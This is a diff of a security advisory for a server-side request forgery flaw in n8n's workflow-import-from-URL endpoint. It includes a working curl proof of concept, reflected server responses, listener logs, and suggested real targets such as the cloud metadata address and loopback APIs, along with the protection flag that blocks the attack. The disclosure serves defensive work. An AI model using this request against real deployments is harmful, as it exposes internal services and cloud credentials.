@@ -111,64 +111,64 @@ request should then be rejected.
 
 ## Proof of concept
 
-### Original behavior (2.19.0)
-
-Validated against `docker run -p 5678:5678 n8nio/n8n:2.19.0`. Prerequisite: any
-authenticated account with `workflow:create` in at least one project.
-
-```bash
-curl -v -G -b /tmp/n8n-cookies.txt \
-  'http://localhost:5678/rest/workflows/from-url' \
-  --data-urlencode "projectId=$PROJECT_ID" \
-  --data-urlencode 'url=http://172.17.0.1:8888/'
-```
-
-The n8n server made the outbound request to the chosen internal address
-(confirmed in the target's access log). When the internal service returned JSON
-with `nodes`/`connections` keys, the full body was reflected with `200 OK`:
-
-```
-HTTP/1.1 200 OK
-{"data":{"nodes":[],"connections":{},"secret":"SSRF_CONFIRMED"}}
-```
-
-### Latest release, default config (n8n@2.28.2, executed 2026-06-26; listener timestamps UTC)
-
-This confirms the issue persists on the current release out of the box.
-
-**Setup.** A stock container, no flags
-(`docker run -d -p 5678:5678 -e N8N_SECURE_COOKIE=false n8nio/n8n:2.28.2`). The
-attacker-supplied `url` is `http://172.17.0.1:8888/`, chosen to stand in for an
-internal target:
+**Setup (common to both runs).** The attacker-supplied `url` is
+`http://172.17.0.1:8888/`, chosen to stand in for an internal target:
 
 - `172.17.0.1` is the Docker bridge gateway — the host as seen *from inside* the
   n8n container, an address the server can reach but an external attacker cannot.
 - It sits in `172.16.0.0/12` (RFC1918), the exact range n8n's blocklist covers,
   so the *same* URL exercises both states (reflected by default, blocked when
   protection is on).
-- `:8888` is a logging HTTP listener returning workflow-shaped JSON, so n8n
+- `:8888` is a logging HTTP listener that returns workflow-shaped JSON, so n8n
   treats the fetch as a successful import and reflects the body; its log records
   who connected.
 
 In a real deployment an attacker would substitute a sensitive internal target
 reachable by the n8n host, e.g. `http://169.254.169.254/latest/meta-data/`
 (cloud metadata), `http://127.0.0.1:5678/rest/...` (n8n's own loopback APIs), or
-any `http://10.x/192.168.x` internal service.
+any `http://10.x`/`192.168.x` internal service.
 
-**Result (default, no flags)** — the fetch fires and the body is reflected; the
-log line `from=172.17.0.2` is the n8n container's own IP, proving the request was
-made server-side, not by the client:
+The request itself is the same in every run below — prerequisite: an
+authenticated account with `workflow:create` in at least one project:
+
+```bash
+curl -s -G -b cookies.txt \
+  'http://localhost:5678/rest/workflows/from-url' \
+  --data-urlencode "projectId=$PROJECT_ID" \
+  --data-urlencode 'url=http://172.17.0.1:8888/'
+```
+
+### Original behavior (2.19.0)
+
+`docker run -p 5678:5678 n8nio/n8n:2.19.0`. The server made the outbound request
+to the internal address (confirmed in the listener's log) and, because the
+target returned JSON with `nodes`/`connections` keys, reflected the full body:
 
 ```
-GET /rest/workflows/from-url ... url=http://172.17.0.1:8888/
+--> HTTP 200
+{"data":{"nodes":[],"connections":{},"secret":"SSRF_CONFIRMED"}}
+```
+
+### Latest release, default config (n8n@2.28.2)
+
+A stock container, no flags
+(`docker run -d -p 5678:5678 -e N8N_SECURE_COOKIE=false n8nio/n8n:2.28.2`),
+executed 2026-06-26; listener timestamps are UTC. This confirms the issue
+persists on the current release out of the box. The fetch fires and the body is
+reflected; the log line `from=172.17.0.2` is the n8n container's own IP, proving
+the request was made server-side, not by the client:
+
+```
 --> HTTP 200
 {"data":{"nodes":[],"connections":{},"secret":"SSRF_CONFIRMED_2282"}}
 
 listener log: VICTIM-HIT path=/ UA=n8n from=172.17.0.2
 ```
 
-**Contrast — same request with `N8N_SSRF_PROTECTION_ENABLED=true`** (blocked, no
-request reaches the listener):
+### Same request with protection enabled
+
+Identical request, but with `N8N_SSRF_PROTECTION_ENABLED=true` — blocked at
+validation; no request reaches the listener:
 
 ```
 --> HTTP 400
